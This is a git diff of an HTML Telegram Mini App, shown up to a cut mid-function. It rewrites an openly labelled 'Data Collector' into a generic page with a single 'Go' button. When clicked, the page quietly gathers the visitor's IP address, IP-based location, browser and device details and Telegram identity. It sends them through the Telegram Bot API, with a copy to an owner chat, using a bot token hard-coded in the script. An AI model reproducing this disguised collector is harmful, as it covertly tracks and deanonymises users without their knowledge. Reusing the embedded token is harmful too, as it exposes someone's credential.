@@ -3,791 +3,688 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Mini App - Отправка данных</title>
+    <title>Веб-приложение</title>
     <style>
-        :root {
-            --tg-theme-bg-color: #ffffff;
-            --tg-theme-text-color: #000000;
-            --tg-theme-button-color: #40a7e3;
-            --tg-theme-button-text-color: #ffffff;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        * {
             margin: 0;
-            padding: 20px;
-            background: var(--tg-theme-bg-color);
-            color: var(--tg-theme-text-color);
-            transition: all 0.3s ease;
+            padding: 0;
+            box-sizing: border-box;
         }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 20px 0;
-            margin-bottom: 30px;
-            border-bottom: 1px solid rgba(0,0,0,0.1);
-        }
-        
-        .user-card {
-            background: linear-gradient(135deg, rgba(64, 167, 227, 0.1) 0%, rgba(64, 167, 227, 0.05) 100%);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 25px;
-            border: 1px solid rgba(64, 167, 227, 0.2);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-        
-        .user-info {
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
+            justify-content: center;
             align-items: center;
-            gap: 20px;
-            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
         }
-        
-        .avatar {
+
+        /* Фоновые элементы */
+        .bg-bubbles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .bubble {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            animation: float 15s infinite linear;
+        }
+
+        .bubble:nth-child(1) {
             width: 80px;
             height: 80px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid var(--tg-theme-button-color);
+            top: 20%;
+            left: 10%;
+            animation-delay: 0s;
         }
-        
-        .user-details {
-            flex: 1;
+
+        .bubble:nth-child(2) {
+            width: 120px;
+            height: 120px;
+            top: 60%;
+            left: 80%;
+            animation-delay: -5s;
         }
-        
-        .username {
-            font-size: 24px;
-            font-weight: 700;
-            margin: 0 0 5px 0;
-            color: var(--tg-theme-text-color);
+
+        .bubble:nth-child(3) {
+            width: 60px;
+            height: 60px;
+            top: 80%;
+            left: 20%;
+            animation-delay: -10s;
         }
-        
-        .user-id {
-            font-size: 16px;
-            color: #666;
-            margin: 0 0 10px 0;
-            font-family: monospace;
-            background: rgba(0,0,0,0.05);
-            padding: 4px 8px;
-            border-radius: 4px;
-            display: inline-block;
+
+        .bubble:nth-child(4) {
+            width: 100px;
+            height: 100px;
+            top: 40%;
+            left: 70%;
+            animation-delay: -7s;
         }
-        
-        .user-stats {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
+
+        .bubble:nth-child(5) {
+            width: 90px;
+            height: 90px;
+            top: 10%;
+            left: 85%;
+            animation-delay: -12s;
         }
-        
-        .stat-item {
-            background: rgba(255,255,255,0.9);
-            padding: 8px 15px;
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0.5;
+            }
+            50% {
+                transform: translateY(-100px) rotate(180deg);
+                opacity: 0.8;
+            }
+        }
+
+        /* Контейнер */
+        .container {
+            position: relative;
+            z-index: 2;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            padding: 40px;
+            backdrop-filter: blur(20px);
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+
+        /* Логотип */
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            background: linear-gradient(135deg, #fff, #f0f0f0);
             border-radius: 20px;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        
-        .data-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .data-card {
-            background: rgba(255,255,255,0.9);
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.08);
-            border: 1px solid rgba(0,0,0,0.05);
-            transition: transform 0.2s ease;
-        }
-        
-        .data-card:hover {
-            transform: translateY(-2px);
-        }
-        
-        .card-title {
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            color: #666;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .card-value {
-            font-size: 18px;
-            font-weight: 600;
-            color: #333;
-            word-break: break-word;
-        }
-        
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin: 30px 0;
-        }
-        
-        .button {
-            padding: 18px 24px;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
+            box-shadow: 
+                0 10px 20px rgba(0, 0, 0, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.8);
+            transform-style: preserve-3d;
+            perspective: 1000px;
+        }
+
+        .logo-inner {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 10px;
+            transform: rotate(45deg);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-inner::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0.3) 0%,
+                transparent 50%
+            );
+            transform: rotate(45deg);
+        }
+
+        /* Основная кнопка */
+        .main-button {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
             gap: 12px;
-            width: 100%;
-        }
-        
-        .primary-btn {
-            background: linear-gradient(135deg, var(--tg-theme-button-color) 0%, #2d96d8 100%);
-            color: var(--tg-theme-button-text-color);
-            box-shadow: 0 4px 15px rgba(64, 167, 227, 0.4);
-        }
-        
-        .secondary-btn {
-            background: rgba(255,255,255,0.9);
-            color: #333;
-            border: 2px solid var(--tg-theme-button-color);
-        }
-        
-        .success-btn {
-            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
+            padding: 20px 40px;
+            font-size: 20px;
+            font-weight: 600;
             color: white;
-            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+            box-shadow: 
+                0 10px 20px rgba(0, 0, 0, 0.2),
+                0 6px 6px rgba(0, 0, 0, 0.1);
+            min-width: 200px;
+            margin-top: 20px;
         }
-        
-        .button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+
+        .main-button:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.3),
+                0 15px 12px rgba(0, 0, 0, 0.1);
+            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
         }
-        
-        .button:active {
-            transform: translateY(-1px);
+
+        .main-button:active {
+            transform: translateY(-2px) scale(1.02);
+            transition: all 0.1s;
         }
-        
-        .button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-        
-        .status-message {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            display: none;
-            align-items: center;
-            gap: 12px;
-            animation: slideIn 0.3s ease;
-        }
-        
-        .success {
-            background: rgba(76, 175, 80, 0.1);
-            color: #2e7d32;
-            border: 1px solid rgba(76, 175, 80, 0.3);
-        }
-        
-        .error {
-            background: rgba(244, 67, 54, 0.1);
-            color: #c62828;
-            border: 1px solid rgba(244, 67, 54, 0.3);
-        }
-        
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .history-section {
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(0,0,0,0.1);
-        }
-        
-        .history-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        
-        .history-item {
-            background: rgba(255,255,255,0.9);
-            padding: 15px;
-            border-radius: 10px;
-            border-left: 4px solid var(--tg-theme-button-color);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-        
-        .history-time {
-            font-size: 12px;
-            color: #888;
-        }
-        
-        .history-user {
-            font-weight: 500;
-        }
-        
-        .emoji {
+
+        .main-button .arrow {
+            transition: transform 0.3s ease;
             font-size: 24px;
         }
-        
-        .info-box {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid rgba(255, 193, 7, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            color: #ff9800;
+
+        .main-button:hover .arrow {
+            transform: translateX(5px);
         }
-        
-        @media (max-width: 600px) {
-            body {
-                padding: 15px;
+
+        .main-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: left 0.7s;
+        }
+
+        .main-button:hover::before {
+            left: 100%;
+        }
+
+        /* Эффект пульсации */
+        @keyframes pulse {
+            0% {
+                box-shadow: 
+                    0 0 0 0 rgba(102, 126, 234, 0.4),
+                    0 10px 20px rgba(0, 0, 0, 0.2);
             }
-            
-            .user-info {
-                flex-direction: column;
-                text-align: center;
+            70% {
+                box-shadow: 
+                    0 0 0 15px rgba(102, 126, 234, 0),
+                    0 10px 20px rgba(0, 0, 0, 0.2);
             }
-            
-            .avatar {
-                width: 70px;
-                height: 70px;
+            100% {
+                box-shadow: 
+                    0 0 0 0 rgba(102, 126, 234, 0),
+                    0 10px 20px rgba(0, 0, 0, 0.2);
             }
-            
-            .username {
-                font-size: 20px;
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Сообщение */
+        .message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px 40px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            display: none;
+            text-align: center;
+            max-width: 90%;
+            width: 400px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .message.show {
+            display: block;
+            animation: slideIn 0.3s ease;
+        }
+
+        .message.success {
+            background: rgba(76, 175, 80, 0.95);
+            color: white;
+        }
+
+        .message.error {
+            background: rgba(244, 67, 54, 0.95);
+            color: white;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -40%);
             }
-            
-            .data-grid {
-                grid-template-columns: 1fr;
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
             }
-            
-            .button {
-                padding: 16px 20px;
+        }
+
+        .message-content {
+            font-size: 16px;
+            margin: 15px 0;
+        }
+
+        .message-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .message-close {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: 500;
+            transition: background 0.3s;
+        }
+
+        .message-close:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Индикатор загрузки */
+        .loader {
+            display: none;
+            width: 50px;
+            height: 50px;
+            margin: 20px auto;
+            position: relative;
+        }
+
+        .loader:before,
+        .loader:after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: #667eea;
+            animation: spin 1s linear infinite;
+        }
+
+        .loader:after {
+            border-top-color: #764ba2;
+            animation-delay: 0.5s;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Адаптивность */
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+                border-radius: 20px;
+            }
+
+            .main-button {
+                padding: 18px 30px;
+                font-size: 18px;
+                min-width: 180px;
+            }
+
+            .message {
+                width: 320px;
+                padding: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 15px;
+            }
+
+            .logo {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 25px;
+            }
+
+            .logo-inner {
+                width: 30px;
+                height: 30px;
+            }
+
+            .main-button {
+                padding: 16px 24px;
                 font-size: 16px;
+                min-width: 160px;
+            }
+
+            .message {
+                width: 280px;
             }
         }
-        
-        /* Dark theme support */
-        body.dark-mode {
-            background: #1a1a1a;
-            color: #ffffff;
+
+        /* Парящий эффект для контейнера */
+        @keyframes floatContainer {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
         }
-        
-        body.dark-mode .user-card {
-            background: rgba(64, 167, 227, 0.15);
-            border-color: rgba(64, 167, 227, 0.3);
+
+        .container {
+            animation: floatContainer 6s ease-in-out infinite;
         }
-        
-        body.dark-mode .data-card {
-            background: rgba(255,255,255,0.08);
-            color: #ffffff;
-        }
-        
-        body.dark-mode .card-value {
-            color: #ffffff;
-        }
-        
-        body.dark-mode .card-title {
-            color: #aaa;
-        }
-        
-        body.dark-mode .stat-item {
-            background: rgba(255,255,255,0.1);
-            color: #ffffff;
-        }
-        
-        body.dark-mode .history-item {
-            background: rgba(255,255,255,0.08);
+
+        /* Эффект градиентной границы */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, 
+                #667eea, #764ba2, #667eea, #764ba2);
+            border-radius: 26px;
+            z-index: -1;
+            opacity: 0.3;
+            filter: blur(10px);
         }
     </style>
 </head>
 <body>
+    <!-- Фоновые пузыри -->
+    <div class="bg-bubbles">
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+    </div>
+
+    <!-- Основной контейнер -->
     <div class="container">
-        <div class="header">
-            <h1 style="font-size: 28px; margin-bottom: 10px;">🤖 Telegram Data Collector</h1>
-            <p style="color: #666; font-size: 16px;">Все данные автоматически отправляются в вашего Telegram бота</p>
+        <!-- Логотип -->
+        <div class="logo">
+            <div class="logo-inner"></div>
         </div>
-        
-        <div class="user-card">
-            <div class="user-info">
-                <img id="userAvatar" src="" alt="Аватар" class="avatar">
-                <div class="user-details">
-                    <h2 id="userName" class="username">Загрузка...</h2>
-                    <div id="userId" class="user-id">ID: определяем...</div>
-                    <div class="user-stats">
-                        <div class="stat-item" id="userLang">
-                            <span>🌐</span> Язык: ...
-                        </div>
-                        <div class="stat-item" id="userPremium">
-                            <span>⭐</span> Premium: ...
-                        </div>
-                        <div class="stat-item" id="userPlatform">
-                            <span>📱</span> Платформа: ...
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="info-box">
-            <strong>ℹ️ Информация:</strong> При нажатии кнопки ниже, все данные автоматически отправятся в Telegram бота. 
-            Вам не нужно вводить токен или Chat ID вручную.
-        </div>
-        
-        <div class="data-grid">
-            <div class="data-card">
-                <div class="card-title">
-                    <span>🌐</span> IP Адрес
-                </div>
-                <div id="deviceIP" class="card-value">Определяем...</div>
-            </div>
-            
-            <div class="data-card">
-                <div class="card-title">
-                    <span>📍</span> Локация
-                </div>
-                <div id="deviceLocation" class="card-value">Определяем...</div>
-            </div>
-            
-            <div class="data-card">
-                <div class="card-title">
-                    <span>📱</span> Устройство
-                </div>
-                <div id="deviceType" class="card-value">Определяем...</div>
-            </div>
-            
-            <div class="data-card">
-                <div class="card-title">
-                    <span>🕐</span> Время
-                </div>
-                <div id="deviceTime" class="card-value">--:--:--</div>
-            </div>
-            
-            <div class="data-card">
-                <div class="card-title">
-                    <span>🌐</span> Браузер
-                </div>
-                <div id="deviceBrowser" class="card-value">Определяем...</div>
-            </div>
-            
-            <div class="data-card">
-                <div class="card-title">
-                    <span>📏</span> Экран
-                </div>
-                <div id="deviceScreen" class="card-value">Определяем...</div>
-            </div>
-        </div>
-        
-        <div class="button-container">
-            <button class="button primary-btn" id="sendButton" onclick="sendToTelegramBot()">
-                <span class="emoji">🚀</span>
-                Отправить данные в бота
-            </button>
-            
-            <button class="button secondary-btn" onclick="copyAllData()">
-                <span class="emoji">📋</span>
-                Скопировать все данные
-            </button>
-            
-            <button class="button success-btn" onclick="viewHistory()">
-                <span class="emoji">📊</span>
-                Показать историю
-            </button>
-        </div>
-        
-        <div id="statusMessage" class="status-message"></div>
-        
-        <div class="history-section">
-            <h3 style="font-size: 20px; margin-bottom: 15px;">📝 История отправок</h3>
-            <div id="historyList" class="history-list">
-                <p style="text-align: center; color: #888; padding: 20px;">
-                    История будет появляться здесь после отправки данных
-                </p>
-            </div>
-        </div>
+
+        <!-- Главная кнопка -->
+        <button class="main-button pulse" id="goButton">
+            <span>Перейти</span>
+            <span class="arrow">→</span>
+        </button>
+
+        <!-- Индикатор загрузки -->
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <!-- Сообщение -->
+    <div class="message" id="message">
+        <div class="message-icon" id="messageIcon">✅</div>
+        <div class="message-content" id="messageText"></div>
+        <button class="message-close" onclick="hideMessage()">Закрыть</button>
     </div>
 
     <!-- Telegram Web App SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        // Конфигурация (Используем ВАШ токен бота)
+        // Конфигурация
         const CONFIG = {
             BOT_TOKEN: '7960473361:AAF5A_Ho-re9DU8Rlidb2h6-vAQWCUAtOSQ',
-            AUTO_SEND: true, // Автоматически отправлять при загрузке
-            AUTO_CLOSE: false, // Закрывать Mini App после отправки
-            SAVE_HISTORY: true // Сохранять историю в localStorage
+            AUTO_CLOSE: false,
+            OWNER_CHAT_ID: null // Замените на ваш Chat ID
         };
-        
+
         // Глобальные переменные
         let tg = null;
         let telegramUser = null;
         let deviceData = {};
         let isSending = false;
-        let messageId = null;
-        
+
         // Инициализация приложения
-        async function initApp() {
+        function initApp() {
             try {
                 // Проверяем, открыто ли в Telegram
-                if (typeof window.Telegram === 'undefined' || !window.Telegram.WebApp) {
-                    showError('Пожалуйста, откройте эту страницу через Telegram Mini App');
-                    document.getElementById('sendButton').disabled = true;
-                    return;
+                if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
+                    tg = window.Telegram.WebApp;
+                    tg.expand();
+                    tg.ready();
+                    
+                    // Получаем данные пользователя из Telegram
+                    loadTelegramUserData();
                 }
-                
-                // Инициализируем Telegram Web App
-                tg = window.Telegram.WebApp;
-                tg.expand(); // Разворачиваем на весь экран
-                tg.ready(); // Говорим, что приложение готово
-                
-                // Получаем данные пользователя из Telegram
-                await loadTelegramUserData();
                 
                 // Собираем данные устройства
-                await collectDeviceData();
+                collectDeviceData();
                 
-                // Загружаем историю отправок
-                loadHistory();
-                
-                // Обновляем время каждую секунду
-                setInterval(updateTime, 1000);
-                
-                // Автоматически отправляем данные если включено
-                if (CONFIG.AUTO_SEND) {
-                    setTimeout(() => {
-                        if (!isSending) {
-                            sendToTelegramBot();
-                        }
-                    }, 3000);
-                }
-                
-                // Адаптируем тему под Telegram
-                applyTelegramTheme();
+                // Настраиваем кнопку
+                setupButton();
                 
             } catch (error) {
                 console.error('Ошибка инициализации:', error);
-                showError('Ошибка загрузки приложения: ' + error.message);
             }
         }
-        
+
         // Загрузка данных пользователя Telegram
-        async function loadTelegramUserData() {
+        function loadTelegramUserData() {
             try {
-                const initData = tg.initDataUnsafe;
-                
-                if (initData.user) {
+                const initData = tg?.initDataUnsafe;
+                if (initData?.user) {
                     telegramUser = {
                         id: initData.user.id,
                         username: initData.user.username || null,
                         first_name: initData.user.first_name || '',
                         last_name: initData.user.last_name || '',
                         language_code: initData.user.language_code || 'ru',
-                        is_premium: initData.user.is_premium || false,
-                        photo_url: initData.user.photo_url || 'https://cdn-icons-png.flaticon.com/512/149/149071.png',
-                        query_id: initData.query_id
+                        is_premium: initData.user.is_premium || false
                     };
-                    
-                    // Отображаем данные пользователя
-                    displayUserData();
-                    
-                } else {
-                    // Пользователь не авторизован
-                    telegramUser = {
-                        id: 'anonymous_' + Date.now(),
-                        username: null,
-                        first_name: 'Анонимный',
-                        last_name: 'пользователь',
-                        language_code: 'ru',
-                        is_premium: false
-                    };
-                    
-                    showError('Не удалось получить данные Telegram. Откройте через бота.');
                 }
-                
             } catch (error) {
                 console.error('Ошибка получения данных пользователя:', error);
-                telegramUser = {
-                    id: 'error_' + Date.now(),
-                    username: null,
-                    first_name: 'Ошибка',
-                    last_name: 'загрузки',
-                    language_code: 'ru'
-                };
             }
         }
-        
-        // Отображение данных пользователя
-        function displayUserData() {
-            if (!telegramUser) return;
-            
-            // Имя пользователя
-            const fullName = `${telegramUser.first_name} ${telegramUser.last_name}`.trim();
-            const displayName = fullName || telegramUser.username || `Пользователь ${telegramUser.id}`;
-            document.getElementById('userName').textContent = displayName;
-            
-            // ID пользователя
-            document.getElementById('userId').textContent = `ID: ${telegramUser.id}`;
-            
-            // Username если есть
-            if (telegramUser.username) {
-                const usernameElem = document.createElement('div');
-                usernameElem.className = 'user-id';
-                usernameElem.style.marginTop = '5px';
-                usernameElem.textContent = `@${telegramUser.username}`;
-                document.querySelector('.user-details').appendChild(usernameElem);
-            }
-            
-            // Аватар
-            const avatarImg = document.getElementById('userAvatar');
-            if (telegramUser.photo_url) {
-                avatarImg.src = telegramUser.photo_url;
-                avatarImg.onerror = function() {
-                    this.src = 'https://cdn-icons-png.flaticon.com/512/149/149071.png';
-                };
-            } else {
-                avatarImg.src = 'https://cdn-icons-png.flaticon.com/512/149/149071.png';
-            }
-            
-            // Дополнительная информация
-            document.getElementById('userLang').innerHTML = `<span>🌐</span> Язык: ${telegramUser.language_code}`;
-            document.getElementById('userPremium').innerHTML = `<span>⭐</span> Premium: ${telegramUser.is_premium ? '✅ Да' : '❌ Нет'}`;
-            document.getElementById('userPlatform').innerHTML = `<span>📱</span> Платформа: ${tg.platform}`;
-        }
-        
+
         // Сбор данных устройства
         async function collectDeviceData() {
             try {
                 deviceData = {
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
                     screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     url: window.location.href,
-                    referrer: document.referrer || 'direct',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    referrer: document.referrer || 'direct'
                 };
-                
-                // Определение типа устройства
+
+                // Тип устройства
                 const ua = navigator.userAgent.toLowerCase();
                 if (/mobile|android|iphone|ipad|ipod/.test(ua)) {
                     deviceData.type = /tablet|ipad/.test(ua) ? 'Планшет' : 'Телефон';
                 } else {
                     deviceData.type = 'Компьютер';
                 }
-                document.getElementById('deviceType').textContent = deviceData.type;
-                
-                // Определение браузера
+
+                // Браузер
                 if (ua.includes('chrome') && !ua.includes('edge')) deviceData.browser = 'Chrome';
                 else if (ua.includes('firefox')) deviceData.browser = 'Firefox';
                 else if (ua.includes('safari') && !ua.includes('chrome')) deviceData.browser = 'Safari';
                 else if (ua.includes('edge')) deviceData.browser = 'Edge';
                 else if (ua.includes('opera') || ua.includes('opr')) deviceData.browser = 'Opera';
                 else deviceData.browser = 'Неизвестно';
-                document.getElementById('deviceBrowser').textContent = deviceData.browser;
-                
-                // Получение IP адреса
+
+                // IP и геолокация
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
                     deviceData.ip = ipData.ip;
-                    document.getElementById('deviceIP').textContent = ipData.ip;
                     
-                    // Получение геолокации по IP
                     try {
                         const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                         const geoData = await geoResponse.json();
                         deviceData.location = `${geoData.city || 'Неизвестно'}, ${geoData.country_name || 'Неизвестно'}`;
-                        deviceData.geo = geoData;
-                        document.getElementById('deviceLocation').textContent = deviceData.location;
                     } catch (geoError) {
-                        deviceData.location = 'Не удалось определить';
-                        document.getElementById('deviceLocation').textContent = 'Неизвестно';
+                        deviceData.location = 'Неизвестно';
                     }
                 } catch (ipError) {
                     deviceData.ip = 'Не удалось определить';
                     deviceData.location = 'Неизвестно';
-                    document.getElementById('deviceIP').textContent = 'Ошибка определения';
-                    document.getElementById('deviceLocation').textContent = 'Неизвестно';
                 }
-                
-                // Данные Telegram Web App
-                deviceData.tgPlatform = tg.platform;
-                deviceData.tgVersion = tg.version;
-                deviceData.tgTheme = tg.themeParams;
-                deviceData.initData = tg.initData;
-                
-                // Разрешение экрана
-                document.getElementById('deviceScreen').textContent = deviceData.screen;
-                
+
+                // Данные Telegram Web App если есть
+                if (tg) {
+                    deviceData.tgPlatform = tg.platform;
+                    deviceData.tgVersion = tg.version;
+                }
+
             } catch (error) {
                 console.error('Ошибка сбора данных устройства:', error);
-                showError('Ошибка сбора данных устройства');
             }
         }
-        
-        // Обновление времени
-        function updateTime() {
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString('ru-RU');
-            const dateStr = now.toLocaleDateString('ru-RU');
-            document.getElementById('deviceTime').textContent = `${dateStr} ${timeStr}`;
-            deviceData.timestamp = now.toISOString();
+
+        // Настройка кнопки
+        function setupButton() {
+            const goButton = document.getElementById('goButton');
+            const loader = document.getElementById('loader');
+            
+            goButton.addEventListener('click', async () => {
+                if (isSending) return;
+                
+                isSending = true;
+                goButton.disabled = true;
+                loader.style.display = 'block';
+                
+                try {
+                    // Отправляем данные
+                    const success = await sendDataToBot();
+                    
+                    if (success) {
+                        showMessage('✅ Данные успешно отправлены!', 'success');
+                        
+                        // Закрываем Mini App если в Telegram
+                        if (tg && CONFIG.AUTO_CLOSE) {
+                            setTimeout(() => {
+                                tg.close();
+                            }, 2000);
+                        }
+                    } else {
+                        throw new Error('Не удалось отправить данные');
+                    }
+                    
+                } catch (error) {
+                    console.error('Ошибка:', error);
+                    showMessage('❌ Ошибка отправки данных', 'error');
+                } finally {
+                    isSending = false;
+                    goButton.disabled = false;
+                    loader.style.display = 'none';
+                    
+                    // Восстанавливаем анимацию пульсации через 3 секунды
+                    setTimeout(() => {
+                        goButton.classList.add('pulse');
+                    }, 3000);
+                }
+            });
         }
-        
-        // Отправка данных в Telegram бота
-        async function sendToTelegramBot() {
-            if (isSending) return;
-            
-            const sendButton = document.getElementById('sendButton');
-            const originalText = sendButton.innerHTML;
-            
-            isSending = true;
-            sendButton.innerHTML = '<span class="loading"></span> Отправка...';
-            sendButton.disabled = true;
-            
+
+        // Отправка данных в бота
+        async function sendDataToBot() {
             try {
-                // Формируем сообщение для Telegram
+                // Формируем сообщение
                 const message = createTelegramMessage();
                 
-                // Отправляем сообщение через Telegram Bot API
+                // Определяем chat_id для отправки
+                let chatId;
+                if (telegramUser?.id) {
+                    chatId = telegramUser.id; // Отправляем пользователю
+                } else if (CONFIG.OWNER_CHAT_ID) {
+                    chatId = CONFIG.OWNER_CHAT_ID; // Отправляем владельцу
+                } else {
+                    throw new Error('Не указан получатель');
+                }
+                
+                // Отправляем через Telegram Bot API
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: telegramUser.id, // Отправляем пользователю
+                        chat_id: chatId,
                         text: message,
                         parse_mode: 'HTML',
-                        disable_web_page_preview: true,
-                        reply_markup: {
-                            inline_keyboard: [[
-                                {
-                                    text: "👤 Профиль пользователя",
-                                    url: `tg://user?id=${telegramUser.id}`
-                                }
-                            ]]
-                        }
+                        disable_web_page_preview: true
                     })
                 });
                 
                 const result = await response.json();
                 
                 if (result.ok) {
-                    messageId = result.result.message_id;
-                    
-                    // Сохраняем в историю
-                    if (CONFIG.SAVE_HISTORY) {
-                        saveToHistory(result.result.message_id);
+                    // Отправляем копию владельцу если нужно
+                    if (CONFIG.OWNER_CHAT_ID && telegramUser?.id !== CONFIG.OWNER_CHAT_ID) {
+                        await sendCopyToOwner(message);
                     }
-                    
-                    // Показываем успешное сообщение
-                    showSuccess(`✅ Данные успешно отправлены! Сообщение ID: ${messageId}`);
-                    
-                    // Обновляем кнопку
-                    sendButton.innerHTML = '<span class="emoji">✅</span> Данные отправлены!';
-                    sendButton.style.background = 'linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%)';
-                    
-                    // Отправляем копию себе (владельцу бота) если нужно
-                    await sendCopyToOwner(message);
-                    
-                    // Закрываем Mini App если включено
